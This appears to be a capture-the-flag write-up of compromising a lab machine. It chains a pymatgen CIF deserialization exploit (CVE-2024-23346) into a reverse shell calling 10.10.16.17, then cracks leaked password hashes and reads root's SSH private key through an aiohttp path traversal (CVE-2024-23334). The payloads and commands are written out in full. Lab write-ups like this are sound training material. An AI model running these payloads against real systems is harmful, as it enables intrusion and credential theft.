1,Recon
port scan:
	22/tcp ssh
	5000/tcp upnp `Server: Werkzeug/3.0.3 Python/3.9.5`
We can register into the account and we find a upload page for us.
![](images/Pasted%20image%2020241025070857.png)

And we have known the uploaded file is a cif file, and the server is powered by python, then we can search them and find some interesting vunlers.

`CVE-2024-23346: Arbitrary Code Execution in Pymatgen via Insecure Deserialization`
`https://ethicalhacking.uk/cve-2024-23346-arbitrary-code-execution-in-pymatgen-via-insecure/#gsc.tab=0`

It seems be a RCE for us to exploit it.
And the page of github has given us the poc to check this vulner
`https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f`

```
data_5yOhtAoR
_audit_creation_date            2018-06-08
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("touch pwned");0,0,0'


_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```

Then we can make our own payload to handle a reverse shell 
```
data_5yOhtAoR
_audit_creation_date            2018-06-08
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("/bin/bash -c '/bin/sh -i >& /dev/tcp/10.10.16.17/443 0>&1'");0,0,0'


_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "

```

Then we get the shell as app.

From the home of user app, we can find the credit from app.py
```
app = Flask(__name__)
app.config['SECRET_KEY'] = 'MyS3cretCh3mistry4PP'
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///database.db'
app.config['UPLOAD_FOLDER'] = 'uploads/'
app.config['ALLOWED_EXTENSIONS'] = {'cif'}

db = SQLAlchemy(app)
login_manager = LoginManager(app)
login_manager.login_view = 'login
```

And we can find another user `rosa:x:1000:1000:rosa:/home/rosa:/bin/bash`
Maybe we can use this secret_key to switch to her account.But very sad, we can not directly switch.

There is database.db from /instance and maybe we can crack it.
```
sqlite3 database.db

select * from user;
1|admin|2861debaf8d99436a10ed6f75a252abf
2|app|197865e46b878d9e74a0346b6d59886a
3|rosa|63ed86ee9f624c7b14f1d4f43dc251a5

```
Then we can get the valid credit `rosa:unicorniosrosados` and we can use ssh to login the shell of rosa.

2,shell as root
Firstly we would want to check the `sudo -l`
```
sudo -l
[sudo] password for rosa: 
Sorry, user rosa may not run sudo on chemistry.
```

Continue to check the `netstat` to ensure is there any service in the other ports.

```
netstat -ntlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:5000            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      - 
```

Port 8080 seems like a way to root, so let's forward port to our local machine and check is there anything useful for us.

![](images/Pasted%20image%2020241025074331.png)

Firstly we did not what this service is and how powered.
So i would check the process of target machine.
```
ps -aux | grep "python"
root         872  0.0  0.9  29648 18420 ?        Ss   02:21   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
app         1070 26.7  6.2 1298208 123880 ?      Ssl  02:21 151:10 /usr/bin/python3.9 /home/app/app.py
root        1071  0.0  1.4 257652 28828 ?        Ssl  02:21   0:00 /usr/bin/python3.9 /opt/monitoring_site/app.py
app       543550  0.0  0.4  15720  9532 ?        S    02:57   0:00 python3 -c import pty; pty.spawn("/bin/bash")
rosa     3352233  0.0  0.0   6432   720 pts/1    S+   11:45   0:00 grep --color=auto python

```

And use `whatweb` to check the service of this page.
```
whatweb http://127.0.0.1:8080                                          
http://127.0.0.1:8080 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Python/3.9 aiohttp/3.9.1], IP[127.0.0.1], JQuery[3.6.0], Script, Title[Site Monitoring]
```

`3.9 aiohttp/3.9.1` seems to be our target and let's check this package.
`Proof-of-Concept for LFI/Path Traversal vulnerability in Aiohttp =< 3.9.1`
`https://github.com/z3rObyte/CVE-2024-23334-PoC.git`

We can use ffuf to find the valid file path 
```
ffuf -u http://localhost:8080/FUZZ -w /usr/share/wordlists/dirb/common.txt

                        [Status: 200, Size: 5971, Words: 2391, Lines: 153, Duration: 66ms]
assets                  [Status: 403, Size: 14, Words: 2, Lines: 1, Duration: 17ms]
```

The payload would be 
`curl -s --path-as-is http://localhost:8080/assets/../../../root/.ssh/id_rsa`

And we can get the id_rsa of root.
